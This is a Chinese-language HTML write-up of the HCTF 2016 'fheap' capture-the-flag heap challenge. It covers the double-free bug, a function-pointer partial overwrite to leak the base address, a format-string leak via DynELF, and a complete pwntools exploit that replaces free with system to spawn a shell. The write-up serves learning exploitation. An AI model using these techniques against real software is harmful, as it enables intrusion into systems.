@@ -1,0 +1,645 @@
+<!DOCTYPE HTML>
+<html>
+ <head>
+  <meta charset="utf-8"/>
+  <title>
+   Made with Remarkable!
+  </title>
+  <link href="http://cdnjs.cloudflare.com/ajax/libs/highlight.js/8.1/styles/github.min.css" rel="stylesheet"/>
+  <style type="text/css">
+   h1,h2{border-bottom:1px solid}html a:hover,html pre{background-color:#eee8d5}blockquote,body,h1,h2,h3,h4,h5,h6,html,img,li,ol,p,ul{margin:0;padding:0;font:inherit;vertical-align:baseline}img,ol,p,pre,ul{margin-bottom:20px}html *{font-family:ff-din-web-pro-1,ff-din-web-pro-2,sans-serif;font-size:16px;line-height:19.2px;color-profile:sRGB;color:#657b83}body{margin:40px 70px}p{font-weight:lighter}strong{font-weight:700}ol,ul{margin-left:2em}ol ol,ol ul,ul ol,ul ul{margin-top:10px}li{margin-bottom:3px}h1,h2,h3,h4,h5,h6{font-weight:lighter;text-transform:capitalize;margin-top:20px;margin-bottom:10px}.hljs-strong,h1,mark{font-weight:700}h1,h2{font-size:24.62px;line-height:29.55px}h3{font-size:23.44px;line-height:28.13px}h4,h5,h6{font-size:22.16px;line-height:26.59px}h1 img,h2 img,h3 img,h4 img,h5 img,h6 img,p img{margin-bottom:0}pre{white-space:pre;white-space:pre-wrap;word-wrap:break-word;padding:15px}code,pre{font-family:monospace}blockquote{border-left:4px solid;padding:0 15px}blockquote>:first-child{margin-top:0}blockquote>:last-child{margin-bottom:15px}h1{text-transform:uppercase}h3,h4,h5,h6{border-bottom:none}html body{background-color:#fdf6e3}html h1,html h2,html h3,html h4,html h5,html h6{border-color:#657b83}html pre{color:#586e75}html a,html a:active,html a:visited,html code.url,html h1,html h2,html h3,html h4,html h5,html h6{color:#b58900}@media print{body{margin:0}*{color:#000!important}}table{border-collapse:collapse}td,th{border:1px solid #657b83;padding:.5rem;text-align:left}.hljs{display:block;overflow-x:auto;padding:.5em;background:#fdf6e3;color:#657b83}.hljs-comment,.hljs-quote{color:#93a1a1}.hljs-addition,.hljs-keyword,.hljs-selector-tag{color:#859900}.hljs-doctag,.hljs-literal,.hljs-meta .hljs-meta-string,.hljs-number,.hljs-regexp,.hljs-string{color:#2aa198}.hljs-name,.hljs-section,.hljs-selector-class,.hljs-selector-id,.hljs-title{color:#268bd2}.hljs-attr,.hljs-attribute,.hljs-class .hljs-title,.hljs-template-variable,.hljs-type,.hljs-variable{color:#b58900}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-meta .hljs-keyword,.hljs-selector-attr,.hljs-selector-pseudo,.hljs-subst,.hljs-symbol{color:#cb4b16}.hljs-built_in,.hljs-deletion{color:#dc322f}.hljs-formula{background:#eee8d5}.hljs-emphasis{font-style:italic}
+  </style>
+ </head>
+ <body>
+  <h3 id="hctf-2016-fheap">
+   HCTF 2016 fheap
+  </h3>
+  <h3 id="_1">
+   一. 源码
+  </h3>
+  <p>
+   <a href="./main.c">
+    fheap.c
+   </a>
+  </p>
+  <h3 id="_2">
+   二. 题目分析
+  </h3>
+  <p>
+   <strong>
+    1. 程序的生成
+   </strong>
+  </p>
+  <blockquote>
+   <p>
+    假设我们的源码文件名叫做
+    <code>
+     fheap.c
+    </code>
+   </p>
+  </blockquote>
+  <pre><code>gcc fheap.c -pie -fpic -o fheap
+strip fheap
+</code></pre>
+  <blockquote>
+   <p>
+    其中
+    <code>
+     -fpic
+    </code>
+    是辅助
+    <code>
+     -pie
+    </code>
+    , 没有
+    <code>
+     -fpic
+    </code>
+    将会编译失败.
+    <br/>
+    <code>
+     strip
+    </code>
+    是去除符号表(Discard symbols from object files)
+   </p>
+  </blockquote>
+  <p>
+   <strong>
+    结论
+   </strong>
+   : 平常PWN文件都可以正常调试，可是题目给我们的文件是无法调试的，加大了难度。
+   <br/>
+   <strong>
+    2. 程序的运行
+   </strong>
+  </p>
+  <blockquote>
+   <p>
+    运行之后，三个选项:
+   </p>
+  </blockquote>
+  <ol>
+   <li>
+    create string
+   </li>
+   <li>
+    delete string
+   </li>
+   <li>
+    quit
+   </li>
+  </ol>
+  <blockquote>
+   <ol>
+    <li>
+     选择
+     <code>
+      create string
+     </code>
+     , 输入size, content.
+    </li>
+    <li>
+     选择
+     <code>
+      delete string
+     </code>
+     , 输入id, 是否删除.
+    </li>
+    <li>
+     选择
+     <code>
+      quit
+     </code>
+     , 退出程序.
+    </li>
+   </ol>
+  </blockquote>
+  <p>
+   <strong>
+    结论:
+   </strong>
+   这是程序运行的简单介绍, 实际上就是一个字符串的管理程序。创建就是
+   <code>
+    malloc
+   </code>
+   , 删除
+   <code>
+    free
+   </code>
+   .
+  </p>
+  <p>
+   <strong>
+    3. 程序分析
+   </strong>
+  </p>
+  <p>
+   结构体:
+  </p>
+  <pre><code>typedef struct String{
+    union {
+        char *buf;          //输入的字符串大小&gt;16, 地址付给buf
+        char array[16];             //输入的字符串大小&lt;16, 存放在array中
+    } o;
+    int len;
+    void (*free)(struct String *ptr); //存放的free函数的地址, delete时使用
+} String;
+
+struct {
+    int inuse;
+    String *str;
+} Strings[0x10];
+</code></pre>
+  <blockquote>
+   <p>
+    <strong>
+     1.
+     <code>
+      create string
+     </code>
+    </strong>
+   </p>
+   <blockquote>
+    <ol>
+     <li>
+      字符串块&lt;16, 在原来的堆块上存放输入的字符串。
+      <br/>
+      <img alt="" src="./01.png"/>
+     </li>
+     <li>
+      字符串块&gt;=16,
+      <code>
+       malloc
+      </code>
+      一个输入的字符串大小size的空间， 将该空间地址存放在原来的堆块中。
+      <br/>
+      <img alt="" src="./02.png"/>
+     </li>
+    </ol>
+   </blockquote>
+  </blockquote>
+  <hr/>
+  <blockquote>
+   <p>
+    <strong>
+     2.
+     <code>
+      delete string
+     </code>
+    </strong>
+   </p>
+  </blockquote>
+  <pre><code>关键代码:
+    if (Strings[id].str) {
+        printf("Are you sure?:");
+        read(STDIN_FILENO,buf,0x100);
+        if(strncmp(buf,"yes",3)) {
+            return;
+        }
+        Strings[id].str-&gt;free(Strings[id].str);
+        Strings[id].inuse = 0;
+    }
+</code></pre>
+  <p>
+   存在
+   <code>
+    double free
+   </code>
+   漏洞:
+   <code>
+    fastbin
+   </code>
+   维护的
+   <code>
+    chunk
+   </code>
+   大小从32~128字节, 假定我们执行一下过程.
+  </p>
+  <pre><code>create(4, 'aa')  --&gt; id = 0, 假定堆块地址: 0x5010;
+create(4, 'bb')  --&gt; id = 1, 假定堆块地址: 0x5040
+delete(1)
+delete(0)
+create(0x18, 'a' * 0x18) --&gt; id = 0;
+</code></pre>
+  <p>
+   <strong>
+    注意:
+   </strong>
+   最后一次
+   <code>
+    create(0x18, 'a' * 0x18 )
+   </code>
+   ,
+   <code>
+    malloc
+   </code>
+   两个堆块, 分别为
+   <code>
+    0x5010, 0x5040
+   </code>
+   , 其中
+   <code>
+    0x5040
+   </code>
+   存放的是字符串内容.
+   <code>
+    0x5010
+   </code>
+   存放着
+   <code>
+    0x5040
+   </code>
+   地址, 如下: .
+  </p>
+  <pre><code>0x5000:     0x0000000000000000      0x0000000000000031
+0x5010:     0x0000000000005040      0x0000000000000000
+0x5020:     0x0000000000000018      0x0000000000000d6c(freeShort)
+0x5030:     0x0000000000000000      0x0000000000000031
+0x5040:     0x6161616161616161      0x6161616161616161
+0x5050:     0x6161616161616161      0x0000000000000d52(freeLong)
+</code></pre>
+  <p>
+   假如此时, 我们
+   <code>
+    delete(1)
+   </code>
+   , 关键代码中的
+   <code>
+    Strings[1].str ==&gt; 0x6161616161616161
+   </code>
+   , 为真. 就会执行
+   <code>
+    0x5058
+   </code>
+   的函数(
+   <code>
+    freeLong
+   </code>
+   ).
+   <br/>
+   由此, 我们可以有这样的设想:
+   <code>
+    create(0x20, content)
+   </code>
+   ,
+   <code>
+    content
+   </code>
+   中的内容可以覆盖
+   <code>
+    1
+   </code>
+   中的
+   <code>
+    freeLong
+   </code>
+   函数.
+   <code>
+    delete(1)
+   </code>
+   , 就可以修改程序执行的流程.
+  </p>
+  <p>
+   <strong>
+    4. 涉及的知识点:
+   </strong>
+  </p>
+  <blockquote>
+   <p>
+    <code>
+     fastbin
+    </code>
+    的设计是为了快速的分配而准备的, 先进后出.
+    <br/>
+    <br/>
+    详见:
+    <a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/?spm=a313e.7916648.0.0.rJLhzh">
+     https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/?spm=a313e.7916648.0.0.rJLhzh
+    </a>
+   </p>
+  </blockquote>
+  <p>
+   <strong>
+    4. 程序的调试
+   </strong>
+  </p>
+  <p>
+   <em>
+    任何程序都不是一下子能写成功, 需要调试, 如何调试?
+   </em>
+  </p>
+  <pre><code>from pwn import *
+
+p = process('./fheap')
+......
+gdb.attach(p)
+......
+</code></pre>
+  <blockquote>
+   <p>
+    执行过程中会弹出一个
+    <code>
+     gdb
+    </code>
+    的调试窗口, 这个窗口只和你写的
+    <code>
+     Python
+    </code>
+    脚本进行交互, 我们在
+    <code>
+     Python
+    </code>
+    脚本中写入发送的数据即可.
+   </p>
+  </blockquote>
+  <h3 id="_3">
+   三. 思路总结
+  </h3>
+  <p>
+   <strong>
+    保护检查
+   </strong>
+  </p>
+  <p>
+   <img alt="" src="./03.png"/>
+  </p>
+  <p>
+   <strong>
+    总体思路:
+   </strong>
+   泄露程序基地址, 找出system函数地址. 将free地址覆盖为
+   <code>
+    system
+   </code>
+   , 输入
+   <code>
+    /bin/sh
+   </code>
+   , 释放.
+  </p>
+  <p>
+   <strong>
+    First Step : 泄露程序基地址
+   </strong>
+  </p>
+  <blockquote>
+   <p>
+    <code>
+     objdump -d fheap &gt; fheap.txt
+    </code>
+   </p>
+  </blockquote>
+  <pre><code>freeShort(offset): 0xd52
+freeLong(offset): 0xd6c
+d2d:    e8 5e fc ff ff          
+callq  990 &lt;puts@plt&gt;
+</code></pre>
+  <p>
+   可以看出, 两个
+   <code>
+    free
+   </code>
+   函数与
+   <code>
+    0xd2d
+   </code>
+   只相差一个字节, 于是我们可以将
+   <code>
+    free
+   </code>
+   函数的最后一个字节修改为
+   <code>
+    0x2d
+   </code>
+   , 从而调用
+   <code>
+    puts
+   </code>
+   函数, 将字符串和
+   <code>
+    callq  990
+   </code>
+   这条指令的地址一块打印出来, 然后减去
+   <code>
+    0xd2d
+   </code>
+   , 就是整个程序加载的基地址.
+  </p>
+  <hr/>
+  <p>
+   <strong>
+    泄露system函数地址
+   </strong>
+  </p>
+  <blockquote>
+   <p>
+    利用格式化字符串漏洞, 以及
+    <code>
+     pwntools
+    </code>
+    模块的
+    <code>
+     DynELF
+    </code>
+    来找出
+    <code>
+     system
+    </code>
+    函数地址.
+   </p>
+  </blockquote>
+  <pre><code>def leak(addr):
+    delete(0)
+    data = 'aa%9$s' + '#' * (0x18 - len('aa%9$s')) + p64(print_plt)
+    create(0x20, data)
+    p.recvuntil("quit")
+    p.send("delete ")
+    p.recvuntil("id:")
+    p.sendline(str(1))
+    p.recvuntil('sure?:')
+    p.send("yes0123" + p64(addr))
+    p.recvuntil('aa')
+    data = p.recvuntil("####")[:-4]
+    data += "\x00"
+    return data
+</code></pre>
+  <p>
+   <strong>
+    最后一步
+   </strong>
+  </p>
+  <blockquote>
+   <p>
+    发送”/bin/sh”, 用system函数覆盖free函数.
+   </p>
+  </blockquote>
+  <pre><code>payload = '/bin/sh\x00' + '#' * (0x18 - len('/bin/sh\x00')) + p64(system_addr)
+</code></pre>
+  <h3 id="exp">
+   EXP
+  </h3>
+  <pre><code>from pwn import *
+from ctypes import *
+
+DEBUG = 1
+# context(log_level='debug')
+# context.log_level = 'debug'
+if DEBUG:
+     p = process('./fheap')
+else:
+     r = remote('172.16.4.93', 13025)
+
+print_plt=0
+
+def create(size,content):
+    p.recvuntil("quit")
+    p.send("create ")
+    p.recvuntil("size:")
+    p.sendline(str(size))
+    p.recvuntil('str:')
+    p.send(content.ljust(size,'\x00'))
+    p.recvuntil('n')[:-1]
+
+def delete(idx):
+    p.recvuntil("quit")
+    p.sendline("delete ")
+    p.recvuntil('id:')
+    p.send(str(idx)+'\n')
+    p.recvuntil('sure?:')
+    p.send('yes '+'\n')
+
+def leak(addr):
+    delete(0)
+    data = 'aa%9$s' + '#'*(0x18 - len('aa%9$s')) + p64(print_plt)
+    create(0x20, data)
+    p.recvuntil("quit")
+    p.send("delete ")
+    p.recvuntil('id:')
+    p.send(str(1) + '\n')
+    p.recvuntil('sure?:')
+    p.send('yes01234' + p64(addr))
+    p.recvuntil('aa')
+    data = p.recvuntil('####')[:-4]
+    data += "\x00"
+    return data
+
+def pwn():
+    global print_plt
+
+    create(4,'aa')
+    create(4,'bb')
+    create(4,'cc')   
+    delete(2)
+    delete(1)
+    delete(0)
+
+    data='a' * 0x10 + 'b' * 0x8 + '\x2d' + '\x00'
+    create(0x20, data)
+    delete(1)
+    p.recvuntil('b' * 0x8)
+    data = p.recvline()[:-1]
+
+    if len(data) &gt; 8:
+        data = data[:8]
+    data=u64(data.ljust(8,'\x00'))
+    proc_base = data - 0xd2d
+    print "proc base", hex(proc_base)
+    print_plt = proc_base + 0x9d0
+
+    print "print plt", hex(print_plt)
+    delete(0)
+
+
+    #part2
+    data='a' * 0x10 + 'b'*0x8 +'\x2D'+'\x00'
+    create(0x20, data)
+    gdb.attach(p)
+    delete(1)
+    p.recvuntil('b'*0x8)
+    data = p.recvline()[:-1]
+#    gdb.attach(p)
+    d = DynELF(leak, proc_base, elf=ELF('./fheap'))
+    system_addr = d.lookup('system', 'libc')
+    print "system_addr:", hex(system_addr)
+
+    #part3
+    delete(0)
+    data='/bin/sh;' + '#' * (0x18 - len('/bin/sh;')) + p64(system_addr)
+    create(0x20, data)
+    delete(1)
+    p.interactive()
+
+if __name__ == '__main__':
+    pwn()
+</code></pre>
+  <h3 id="_4">
+   心得
+  </h3>
+  <blockquote>
+   <p>
+    这是我第一次接触堆方面的题, 说实话这个过程实在很苦.
+   </p>
+   <blockquote>
+    <ol>
+     <li>
+      网上找的相关文章, 水平参差不齐, EXP基本不能成功的GetShell.
+     </li>
+     <li>
+      调试方面的锅, 不能直接调试.
+     </li>
+     <li>
+      堆方面的知识太少, 还得练.
+     </li>
+    </ol>
+   </blockquote>
+  </blockquote>
+  <p>
+   <strong>
+    最后, 与君共勉, 加油!!!
+   </strong>
+  </p>
+  <h3 id="_5">
+   相关链接:
+  </h3>
+  <ol>
+   <li>
+    <a href="https://www.anquanke.com/post/id/85281">
+     逆向安全系列：Use After Free漏洞浅析
+    </a>
+    (EXP有效)
+   </li>
+   <li>
+    <a href="https://cartermgj.github.io/2016/12/01/Hctf-jiushigan/">
+     fast-bin内存机制的利用探究
+    </a>
+    (调试新方法, 针对地址随机化)
+   </li>
+   <li>
+    <a href="http://www.cnblogs.com/shangye/p/6156391.html">
+     hctf2016 fheap学习(FreeBuf发表的官方解法)
+    </a>
+    (知识点较全)
+   </li>
+   <li>
+    <a href="https://github.com/vidar-team/HCTF2016">
+     HCTF开源Github
+    </a>
+   </li>
+   <li>
+    <a href="https://github.com/BBS-Bill-Gates/CTF/tree/master/2016/HCTF/fheap">
+     相关文件下载
+    </a>
+   </li>
+  </ol>
+  <script src="http://cdnjs.cloudflare.com/ajax/libs/highlight.js/8.1/highlight.min.js">
+  </script>
+  <script>
+   hljs.initHighlightingOnLoad();
+  </script>
+  <script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML" type="text/javascript">
+  </script>
+  <script type="text/javascript">
+   MathJax.Hub.Config({"showProcessingMessages" : false,"messageStyle" : "none","tex2jax": { inlineMath: [ [ "$", "$" ] ] }});
+  </script>
+ </body>
+</html>
